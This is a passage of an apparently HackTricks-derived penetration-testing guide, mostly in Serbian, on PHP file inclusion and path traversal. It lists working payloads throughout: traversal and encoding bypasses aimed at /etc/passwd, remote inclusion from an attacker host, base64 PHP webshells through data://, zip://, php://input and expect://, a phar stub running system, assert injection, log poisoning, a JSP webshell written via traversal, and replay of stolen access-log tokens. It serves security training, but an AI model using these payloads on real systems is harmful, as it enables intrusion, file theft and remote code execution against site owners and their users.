# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Fajl se učitava sa udaljenog servera (najbolje: možeš napisati kod koji će server izvršiti). U PHP-u je ovo po defaultu **onemogućeno** (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalni fajl.

Ranljivost nastaje kada korisnik na neki način može kontrolisati koji fajl će server učitati.

Ranjive **PHP funkcije**: require, require_once, include, include_once

Zanimljiv alat za iskorišćavanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE fajlovi
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mešajući nekoliko \*nix LFI listi i dodajući još puteva napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe da promenite `/` u `\`\
Pokušajte takođe da dodate `../../../../../`

Lista koja koristi više tehnika za pronalaženje fajla /etc/password (da bi se proverilo da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte takođe da promenite `/` u `\`\
Pokušajte takođe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi više tehnika za pronalaženje fajla /boot.ini (da bi se proverilo da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za Linux.

## Basic LFI and bypasses

Svi primeri su za Local File Inclusion ali se mogu primeniti i na Remote File Inclusion takođe (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja više karaktera na kraju prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Enkodiranje**

Možete koristiti nestandardna enkodiranja kao što su double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Moderni HTML-to-PDF engine-i (npr. **TCPDF** ili wrapper-i kao **html2pdf**) rado parsiraju HTML, SVG, CSS i URL-ove fontova koje napadač obezbedi, ali rade unutar poverljivih backend mreža sa pristupom fajl-sistemu. Ako možete da ubacite HTML u `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, često možete exfiltrate lokalne fajlove koje nalog web servera može da čita.

- **Fingerprint the renderer**: svaki generisani PDF sadrži `Producer` polje (npr. `TCPDF 6.8.2`). Poznavanje tačnog build-a govori vam koji path filteri postoje i da li se URL decoding vrši pre validacije.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` čita `xlink:href` atribut iz `<image>` elemenata pre poziva `urldecode()`. Umetanje malicioznog SVG-a unutar data URI čini da mnogi HTML sanitizers ignorišu payload dok TCPDF ipak parsira it:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF prepends `$_SERVER['DOCUMENT_ROOT']` to paths beginning with `/` and only later resolves `..`, so use either leading `../../..` segments or `/../../..` to escape the root after the prepend.
- **Kodiranje da bi se zaobišli naivni filteri**: Verzije ≤6.8.2 proveravaju samo literalni podniz `../` *pre* dekodiranja URL-a. Slanje `..%2f` (ili `..%2F`) u SVG-u ili u sirovom `<img src>` atributu zaobilazi proveru, jer se sekvenca `../` ponovo sastavlja tek nakon što TCPDF pozove `urldecode()`.
- **Duplo kodiranje za višestepeno dekodiranje**: Ako korisnički ulaz dekodira web framework *i* TCPDF, dvostruko kodirajte slash (`%252f`). Jedno dekodiranje pretvara ga u `%2f`, drugo dekodiranje u TCPDF-u pretvara ga u `/`, dovodeći `/..%252f..` → `/../../../…` bez ikada prikazivanja `../` ranom filteru.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` sadrži istu grešku redosleda operacija, što dozvoljava direktne HTML payloads kao što je `src="%2f..%252f..%252ftmp%252fsecret.png"` da pročitaju bilo koji lokalno dostupan bitmap.

Ova tehnika leaks sve što PDF worker može da pročita (passport scans, API keys rendered as images, etc.). Ispravljeno je u 6.9.1 canonicalisanjem putanja (`isRelativePath()`), tako da tokom testova prioritizujte starije verzije `Producer`.

### Iz postojeće fascikle

Možda back-end proverava putanju foldera:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma fajl sistema na serveru

Fajl sistem servera može se rekurzivno istražiti kako bi se identifikovali direktorijumi, a ne samo fajlovi, koristeći određene tehnike. Ovaj proces podrazumeva utvrđivanje dubine direktorijuma i ispitivanje postojanja konkretnih direktorijuma. Ispod je detaljna metoda za postizanje toga:

1. **Utvrđivanje dubine direktorijuma:** Odredite dubinu trenutnog direktorijuma uspešnim dohvatom `/etc/passwd` fajla (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, ukazujući na dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Dodajte ime sumnjivog foldera (npr. `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera ukazuje da li direktorijum postoji:
- **Greška / bez izlaza:** Direktorijum `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisutnost direktorijuma `private` je potvrđena.
4. **Rekurzivno istraživanje:** Otkriveni direktorijumi mogu se dalje ispitivati za poddirektorijume ili fajlove koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na drugim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pod pretpostavkom da je trenutni direktorijum na dubini od 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup zaštićenim fajlovima tako što zaobilazi određene bezbednosne mere koje dodaju dodatne karaktere na kraj putanja fajlova. Cilj je konstruisati putanju fajla koja, nakon što je bezbednosna mera izmeni, i dalje pokazuje na željeni fajl.

U PHP-u, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog načina na koji radi fajl sistem. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Kada poslednjih 6 karaktera budu `passwd`, dodavanje `/` (tako da postane `passwd/`) ne menja ciljani fajl.
- Slično, ako je `.php` dodat na putanju fajla (npr. `shellcode.php`), dodavanje `/.` na kraju neće promeniti fajl kojem se pristupa.

Sledeći primeri pokazuju kako koristiti path truncation da se pristupi `/etc/passwd`, čestom cilju zbog njegovog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversals može biti oko 2027, ali ovaj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Sekvence traversal-a (`../`) u kombinaciji sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju kroz fajl sistem, efikasno ignorišući dodatne stringove koje server dodaje.
- **Determining the Required Number of Traversals**: Kroz metod pokušaja i greške može se pronaći tačan broj `../` sekvenci potrebnih da se dođe do root direktorijuma, a zatim do `/etc/passwd`, osiguravajući da svi dodati stringovi (kao `.php`) budu neutralisani dok željena putanja (`/etc/passwd`) ostane netaknuta.
- **Starting with a Fake Directory**: Uobičajena je praksa započeti putanju nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi serverove logike parsiranja putanje.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno podrazumevano jer je **`allow_url_include`** na **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** ima vrednost **On**, ali PHP filtrira pristup eksternim web stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protokol sa base64 da dekodirate b64 PHP kod i dobijete RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, na kraju je dodat `+.txt` zato što je napadaču bio potreban string koji se završava sa `.txt`, pa se string završava njime i nakon b64 decode-a taj deo će vratiti samo smeće, a pravi PHP kod će biti uključen (i stoga izvršen).

Još jedan primer **koji ne koristi `php://` protokol** bio bi:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U pythonu, u kodu kao u ovom:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** do **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ovo je očekivano ponašanje prema [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne komponente putanje.

## Java Lista direktorijuma

Izgleda da ako imate Path Traversal u Java i **zatražite direktorijum** umesto fajla, **vraća se sadržaj direktorijuma**. Ovo se neće dešavati u drugim jezicima (koliko znam).

## Top 25 parameters

Evo liste top 25 parametara koji bi mogli biti ranjivi na local file inclusion (LFI) (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI korišćenjem PHP wrappers & protocols

### php://filter

PHP filters omogućavaju izvođenje osnovnih **operacija izmene nad podacima** pre nego što se oni pročitaju ili zapišu. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Napomena: ovaj filter više ne postoji u modernim verzijama PHP-a
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Pretvara u drugo kodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih kodiranja** koje su podržane pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Zloupotrebom `convert.iconv.*` filtera za konverziju možete **generisati proizvoljan tekst**, što može biti korisno za upis proizvoljnog teksta ili da omogućite funkcijama poput include da obrade proizvoljan tekst. Za više informacija pogledajte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (korisno ako eksfiltrirate mnogo informacija)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Zastarelo
- `mdecrypt.*` : Zastarelo
- Ostali filteri
- Pokretanjem u php `var_dump(stream_get_filters());` možete naći nekoliko **neočekivanih filtera**:
- `consumed`
- `dechunk`: poništava HTTP chunked enkodiranje
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika/mala slova

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez toga da server vrati sadržaj. Ova tehnika se zasniva na **boolean exfiltration of the file (char by char) using php filters as oracle**. To je zato što php filters mogu biti korišćeni da učine tekst dovoljno velikim da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak rezime:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

U postu je takođe leaked alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptors koje proces ima otvorene. Potencijalno korisno za leak sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Možete takođe koristiti **php://stdin, php://stdout and php://stderr** da pristupite **file descriptors 0, 1 and 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// i rar://

Otpremite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protocol, on **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Obratite pažnju da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Pomoću ovoga možete izvršavati kod:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Datoteka `.phar` može se iskoristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije kao što su `include` za učitavanje fajlova. PHP kod ispod prikazuje kreiranje `.phar` datoteke:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` fajl, treba izvršiti sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Prilikom izvršavanja, kreiraće se fajl pod imenom `test.phar`, koji bi mogao biti iskorišćen za eksploatisanje Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda unutar njega, preko funkcija poput `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` ili `filesize()`, može se pokušati eksploatisanje deserialization ranjivosti. Ova ranjivost je povezana sa čitanjem fajlova koristeći `phar` protokol.

Za detaljno razumevanje eksploatisanja deserialization ranjivosti u kontekstu `.phar` fajlova, pogledajte dokument linkovan ispod:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Veoma kratak rezime: a **3 byte overflow** u PHP heap-u je zloupotrebljen da bi **izmenio lanac slobodnih chunks** određene veličine kako bi bilo moguće **upisati bilo šta na bilo koju adresu**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alloc-ovati chunks specifičnih veličina zloupotrebom više php filtera.

### More protocols

Pogledajte više mogućih[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Upisuje u memoriju ili u privremeni fajl (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristupanje lokalnom filesystem-u
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristupanje HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristupanje FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalaženje putanja koje odgovaraju šablonu (Ne vraća ništa štampano, tako da ovde nije naročito korisno)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI preko 'assert' funkcije u PHP-u

Rizici od Local File Inclusion (LFI) u PHP-u su naročito veliki kada se radi sa 'assert' funkcijom, koja može izvršavati kod unutar stringova. Ovo je posebno problematično ako se ulaz koji sadrži directory traversal karaktere kao ".." proverava ali nije pravilno sanitarizovan.

Na primer, PHP kod može biti dizajniran da spreči directory traversal na sledeći način:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Dok je cilj ovoga da spreči traversal, to nenamerno stvara vektor za code injection. Da bi se ovo iskoristilo za čitanje sadržaja fajla, napadač bi mogao da koristi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično tome, za izvršavanje proizvoljnih sistemskih komandi, može se upotrebiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **putanju fajla** koja se prosleđuje **PHP funkciji** koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (npr. jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

U [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) je objašnjeno kako se blind path traversal može zloupotrebiti preko PHP filtera da bi se **exfiltrate the content of a file via an error oracle**.

Ukratko, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla bio toliko **velik** da će **PHP funkcija koja otvara** fajl pokrenuti **error**.

Zatim, da bi se procurio (leak) prvi karakter, filter **`dechunk`** se koristi zajedno sa drugim poput **base64** ili **rot13**, a konačno se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da bi se **postavili drugi karakteri na početak i leak-ovali ih**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prima/upload-uje fajlove gradi destinacionu putanju koristeći podatke kojima korisnik upravlja (npr. filename ili URL) bez canonicalisation i validacije, `..` segmenata i apsolutne putanje mogu izaći iz nameravane direktorijumske strukture i izazvati arbitrary file write. Ako možete postaviti payload u web-exposed directory, obično dobijate unauthenticated RCE ubacivanjem webshell-a.

Typical exploitation workflow:
- Identifikujte write primitive u endpointu ili background worker-u koji prihvata path/filename i zapisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed directories. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sastavite traversal path koji izlazi iz nameravanog storage direktorijuma u webroot i uključite sadržaj vašeg webshell-a.
- Posetite ubačeni payload i izvršite komande.

Napomene:
- Vulnerable servis koji vrši write može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije služiti vaš payload.
- Na Java stack-ovima, ovi file writes se često implementiraju jednostavnom `File`/`Paths` konkatenacijom. Nedostatak canonicalisation/allow-listinga je osnovni propust.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Ojačavanje koje onemogućava ovu klasu bagova:
- Rešavajte do kanoničkog puta i osigurajte da je potomak osnovnog direktorijuma na listi dozvoljenih.
- Odbacite svaki put koji sadrži `..`, apsolutne root-ove, ili slova drajva; radije koristite generisane nazive fajlova.
- Pokrenite writer kao nalog sa niskim privilegijama i odvojite direktorijume za pisanje od root direktorijuma koji se služe.

## Remote File Inclusion

Objašnjeno ranije, [**follow this link**](#remote-file-inclusion).

### Preko Apache/Nginx log fajla

Ako je Apache ili Nginx server **ranjiv na LFI** unutar include funkcije, možete pokušati da pristupite **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, ubacite u **user agent** ili u **GET parameter** php shell kao **`<?php system($_GET['c']); ?>`** i uključite taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici će biti izmenjeni u string "_**quote;**_", **PHP će prijaviti grešku** i **ništa drugo neće biti izvršeno**.
>
> Takođe, uverite se da ste **ispravno napisali payload** ili će PHP prijavljivati grešku svaki put kada pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima, ali **budite pažljivi,** kod unutar logova može biti URL encoded i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i to se dekodira u logovima. PHPShell se može umetnuti unutar ovog header-a.\
Ostali mogući putevi log fajlova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Čitanje access logova za prikupljanje GET-based auth tokens (token replay)

Mnoge aplikacije greškom prihvataju session/auth tokens putem GET-a (npr. AuthenticationToken, token, sid). Ako imate path traversal/LFI primitive do web server logova, možete ukrasti te tokene iz access logova i replay-ovati ih kako biste potpuno zaobišli authentication.

Kako-to:
- Koristite traversal/LFI da pročitate web server access log. Uobičajene lokacije:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Neki endpoints vraćaju file reads Base64-encoded. Ako je tako, dekodirajte lokalno i pregledajte linije loga.
- Koristite grep da pronađete GET zahteve koji sadrže token parametar i zabeležite njegovu vrednost, zatim je replay-ujte prema application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodiraj telo ako je u Base64, zatim replay uhvaćen token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Beleške:
- Tokens in URLs are logged by default; never accept bearer tokens via GET in production systems.
- If the app supports multiple token names, search for common keys like AuthenticationToken, token, sid, access_token.
- Rotate any tokens that may have leaked to logs.

### Putem e-pošte

**Pošaljite mejl** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da include-ujete mejl korisnika koristeći putanju kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/*/fd/*

1. Upload-ujte mnogo shells (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), sa $PID = PID procesa (može se brute forced) i $FD = file descriptor (takođe se može brute forced)

### Putem /proc/self/environ

Slično log fajlu, pošaljite payload u User-Agent, biće reflektovan unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem upload

